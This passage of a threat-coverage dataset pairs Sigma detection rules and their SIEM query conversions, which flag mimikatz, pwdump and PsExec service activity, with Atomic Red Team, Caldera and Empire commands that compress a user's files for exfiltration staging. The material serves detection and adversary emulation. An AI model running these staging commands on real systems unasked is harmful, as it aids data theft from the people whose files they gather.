\"Detects well-known credential dumping tools execution via service execution events\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.execution\",\\n      \"attack.t1003\",\\n      \"attack.t1035\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7045\\\\\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.*\\\\\\\\\\\\\\\\.*|.*\\\\\\\\\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7045\\\\\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.*\\\\\\\\\\\\\\\\.*|.*\\\\\\\\\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Credential dumping tools service execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Credential-dumping-tools-service-execution-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Credential dumping tools service execution\",\\n    \"description\": \"Detects well-known credential dumping tools execution via service execution events\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.execution\",\\n      \"attack.t1003\",\\n      \"attack.t1035\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"6\\\\\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.*\\\\\\\\\\\\\\\\.*|.*\\\\\\\\\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"6\\\\\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.*\\\\\\\\\\\\\\\\.*|.*\\\\\\\\\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Credential dumping tools service execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Credential-dumping-tools-service-execution-3 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Credential dumping tools service execution\",\\n    \"description\": \"Detects well-known credential dumping tools execution via service execution events\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.execution\",\\n      \"attack.t1003\",\\n      \"attack.t1035\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4697\\\\\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.*\\\\\\\\\\\\\\\\.*|.*\\\\\\\\\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4697\\\\\" AND (ServiceName.keyword:(*fgexec* OR *wceservice* OR *wce\\\\\\\\ service* OR *pwdump* OR *gsecdump* OR *cachedump* OR *mimikatz* OR *mimidrv*) OR ImagePath.keyword:(*fgexec* OR *dumpsvc* OR *cachedump* OR *mimidrv* OR *gsecdump* OR *servpw* OR *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.*\\\\\\\\\\\\\\\\.*|.*\\\\\\\\\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Credential dumping tools service execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7045\" AND (ServiceName.keyword:(*fgexec* *wceservice* *wce service* *pwdump* *gsecdump* *cachedump* *mimikatz* *mimidrv*) OR ImagePath.keyword:(*fgexec* *dumpsvc* *cachedump* *mimidrv* *gsecdump* *servpw* *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\.*\\\\\\\\.*|.*\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\\n(EventID:\"6\" AND (ServiceName.keyword:(*fgexec* *wceservice* *wce service* *pwdump* *gsecdump* *cachedump* *mimikatz* *mimidrv*) OR ImagePath.keyword:(*fgexec* *dumpsvc* *cachedump* *mimidrv* *gsecdump* *servpw* *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\.*\\\\\\\\.*|.*\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))\\n(EventID:\"4697\" AND (ServiceName.keyword:(*fgexec* *wceservice* *wce service* *pwdump* *gsecdump* *cachedump* *mimikatz* *mimidrv*) OR ImagePath.keyword:(*fgexec* *dumpsvc* *cachedump* *mimidrv* *gsecdump* *servpw* *pwdump*) OR ImagePath:/((\\\\\\\\\\\\\\\\.*\\\\\\\\.*|.*\\\\\\\\)([{]?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}[}])?\\\\.(exe|scr|cpl|bat|js|cmd|vbs).*)/))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "title: PsExec Service Start\nid: 3ede524d-21cc-472d-a3ce-d21b568d8db7\ndescription: Detects a PsExec service start\nauthor: Florian Roth\ndate: 2018/03/13\nmodified: 2012/12/11\ntags:\n    - attack.execution\n    - attack.t1035\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ProcessCommandLine: C:\\Windows\\PSEXESVC.exe\n    condition: selection\nfalsepositives:\n    - Administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PsExec Service Start\nid: 3ede524d-21cc-472d-a3ce-d21b568d8db7\ndescription: Detects a PsExec service start\nauthor: Florian Roth\ndate: 2018/03/13\nmodified: 2012/12/11\ntags:\n    - attack.execution\n    - attack.t1035\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ProcessCommandLine: C:\\Windows\\PSEXESVC.exe\n    condition: selection\nfalsepositives:\n    - Administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "ProcessCommandLine:\"C\\\\:\\\\\\\\Windows\\\\\\\\PSEXESVC.exe\"", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PsExec-Service-Start <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PsExec Service Start\",\\n    \"description\": \"Detects a PsExec service start\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1035\",\\n      \"attack.s0029\"\\n    ],\\n    \"query\": \"ProcessCommandLine:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\PSEXESVC.exe\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"ProcessCommandLine:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\PSEXESVC.exe\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PsExec Service Start\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "ProcessCommandLine:\"C\\\\:\\\\\\\\Windows\\\\\\\\PSEXESVC.exe\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "ProcessCommandLine=\"C:\\\\\\\\Windows\\\\\\\\PSEXESVC.exe\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ProcessCommandLine=\"C:\\\\\\\\Windows\\\\\\\\PSEXESVC.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^C:\\\\Windows\\\\PSEXESVC\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "action: global\ntitle: PsExec Tool Execution\nid: 42c575ea-e41e-41f1-b248-8093c3e82a28\nstatus: experimental\ndescription: Detects PsExec service installation and execution events (service and Sysmon)\nauthor: Thomas Patzke\nreferences:\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\ntags:\n    - attack.execution\n    - attack.t1035\n    - attack.s0029\ndetection:\n    condition: 1 of them\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - ServiceName\n    - ServiceFileName\nfalsepositives:\n    - unknown\nlevel: low\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: PsExec Tool Execution\nid: 42c575ea-e41e-41f1-b248-8093c3e82a28\nstatus: experimental\ndescription: Detects PsExec service installation and execution events (service and Sysmon)\nauthor: Thomas Patzke\nreferences:\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\ntags:\n    - attack.execution\n    - attack.t1035\n    - attack.s0029\ndetection:\n    condition: 1 of them\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - ServiceName\n    - ServiceFileName\nfalsepositives:\n    - unknown\nlevel: low\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ServiceName:\"PSEXESVC\" AND ((EventID:\"7045\" AND ServiceFileName.keyword:*\\\\\\\\PSEXESVC.exe) OR EventID:\"7036\"))\\n(Image.keyword:*\\\\\\\\PSEXESVC.exe AND User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PsExec-Tool-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PsExec Tool Execution\",\\n    \"description\": \"Detects PsExec service installation and execution events (service and Sysmon)\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1035\",\\n      \"attack.s0029\"\\n    ],\\n    \"query\": \"(ServiceName:\\\\\"PSEXESVC\\\\\" AND ((EventID:\\\\\"7045\\\\\" AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\PSEXESVC.exe) OR EventID:\\\\\"7036\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ServiceName:\\\\\"PSEXESVC\\\\\" AND ((EventID:\\\\\"7045\\\\\" AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\PSEXESVC.exe) OR EventID:\\\\\"7036\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PsExec Tool Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n          EventID = {{_source.EventID}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n      ServiceName = {{_source.ServiceName}}\\\\n  ServiceFileName = {{_source.ServiceFileName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PsExec-Tool-Execution-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PsExec Tool Execution\",\\n    \"description\": \"Detects PsExec service installation and execution events (service and Sysmon)\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1035\",\\n      \"attack.s0029\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\PSEXESVC.exe AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\PSEXESVC.exe AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PsExec Tool Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n          EventID = {{_source.EventID}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n      ServiceName = {{_source.ServiceName}}\\\\n  ServiceFileName = {{_source.ServiceFileName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ServiceName:\"PSEXESVC\" AND ((EventID:\"7045\" AND ServiceFileName.keyword:*\\\\\\\\PSEXESVC.exe) OR EventID:\"7036\"))\\n(Image.keyword:*\\\\\\\\PSEXESVC.exe AND User:\"NT AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ServiceName=\"PSEXESVC\" ((EventID=\"7045\" ServiceFileName=\"*\\\\\\\\PSEXESVC.exe\") OR EventID=\"7036\")) | table EventID,CommandLine,ParentCommandLine,ServiceName,ServiceFileName\\n(Image=\"*\\\\\\\\PSEXESVC.exe\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\") | table EventID,CommandLine,ParentCommandLine,ServiceName,ServiceFileName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" service=\"PSEXESVC\" ((event_id=\"7045\" ServiceFileName=\"*\\\\\\\\PSEXESVC.exe\") OR event_id=\"7036\"))\\n(event_id=\"1\" Image=\"*\\\\\\\\PSEXESVC.exe\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*PSEXESVC)(?=.*(?:.*(?:.*(?:.*(?=.*7045)(?=.*.*\\\\PSEXESVC\\\\.exe))|.*7036))))'\\ngrep -P '^(?:.*(?=.*.*\\\\PSEXESVC\\\\.exe)(?=.*NT AUTHORITY\\\\SYSTEM))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET POLICY Possible winexe over SMB - Possible Lateral Movement", "product": "Suricata (NSM)", "name": "ET Open Rule"}, {"query": "ET POLICY PsExec service created", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1002/T1002.yaml", "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\data.zip\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\data.zip\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"%programfiles%/WinRAR/Rar.exe\" a -r #{output_file} #{input_path} *#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"%programfiles%/WinRAR/Rar.exe\" a -r #{output_file} #{input_path} *.txt\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r %USERPROFILE%\\data.rar #{input_path} *#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r %USERPROFILE%\\data.rar %USERPROFILE% *#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path} *#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "zip $HOME/data.zip #{input_files}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "zip $HOME/data.zip $HOME/*.txt\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "tar -cvzf $HOME/data.tar.gz #{input_file_folder}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME\n", "name": null}, {"source": "data/abilities/exfiltration/300157e5-f4ad-4569-b533-9d1fa0e74d74.yml", "command": {"windows": {"psh,pwsh": {"cleanup": "rm #{host.dir.staged}.zip\n", "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "darwin": {"sh": {"cleanup": "rm #{host.dir.staged}.tar.gz\n", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"cleanup": "rm #{host.dir.staged}.tar.gz\n", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "name": "Compress a directory on the file system"}, {"source": "Threat Hunting Tables", "command": "rar.exe", "name": "parent_process"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/zipfolder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/zipfolder", "name": "Empire Module Command"}], "command_list": ["dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\data.zip\n", "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\data.zip\n", "\"%programfiles%/WinRAR/Rar.exe\" a -r #{output_file} #{input_path} *#{file_extension}\n", "\"%programfiles%/WinRAR/Rar.exe\" a -r #{output_file} #{input_path} *.txt\n", "\"#{rar_exe}\" a -r %USERPROFILE%\\data.rar #{input_path} *#{file_extension}\n", "\"#{rar_exe}\" a -r %USERPROFILE%\\data.rar %USERPROFILE% *#{file_extension}\n", "\"#{rar_exe}\" a -r #{output_file} #{input_path} *#{file_extension}\n", "zip $HOME/data.zip #{input_files}\n", "zip $HOME/data.zip $HOME/*.txt\n", "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n", "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n", "tar -cvzf $HOME/data.tar.gz #{input_file_folder}\n", "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME\n", {"windows": {"psh,pwsh": {"cleanup": "rm #{host.dir.staged}.zip\n", "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "darwin": {"sh": {"cleanup": "rm #{host.dir.staged}.tar.gz\n", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"cleanup": "rm #{host.dir.staged}.tar.gz\n", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "rar.exe", "powershell/management/zipfolder", "powershell/management/zipfolder"], "technique_id": "T1002", "parsed_datasets": [{"Atomic Red Team Test - Data Compressed": {"display_name": "Data Compressed", "atomic_tests": [{"description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration \n", "supported_platforms": ["windows"], "name": 